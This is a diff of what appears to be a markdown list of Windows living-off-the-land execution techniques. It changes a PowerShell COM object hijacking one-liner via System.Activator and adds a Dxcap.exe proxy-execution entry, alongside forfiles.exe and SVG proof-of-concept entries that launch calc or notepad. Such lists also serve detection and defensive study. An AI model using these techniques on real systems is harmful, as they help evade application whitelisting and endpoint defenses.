@@ -92,10 +92,10 @@ https://gist.githubusercontent.com/homjxi0e/eb16d75f3db6d6081648f2c5c5c98c3b/raw
 forfiles.exe /c calc.exe
 
 ```
-( 10v4 ) Lateral Movement Using COM Object Hijacking 
+( 10v4 ) Powershell Scriptlet COM Object Hijacking via System.Activator 
 ```
- $COMEx = [Activator]::CreateInstance([type]::GetTypeFromCLSID("{00000001-0000-0000-0000-0000FEEDACDC} "))
- https://gist.github.com/homjxi0e/95aeb250b5290b27804cbe983af91085
+$COMobj = [activator]::CreateInstance([type]::GetTypeFromCLSID("{00020000-0000-0000-C000-000000000046}"));$COMobj.Exec();
+https://gist.github.com/homjxi0e/40f30c3be62c6ef152d6f6fffa9dba3c
 ```
 
 ( 10v5 ) ScriptRunner.exe Execution 
@@ -139,6 +139,11 @@ https://gist.github.com/homjxi0e/0023a9cb5d4fee198019f87bd348effc
 ```
 iexplorer C:\PoC.svg
 https://gist.github.com/homjxi0e/4a38b2402e77a536a4deb17928f9a8b0
+
+```
+(10v14) Dxcap.exe Abuse 
+```
+Dxcap.exe -c C:\Windows\System32\notepad.exe    
 
 ```
 
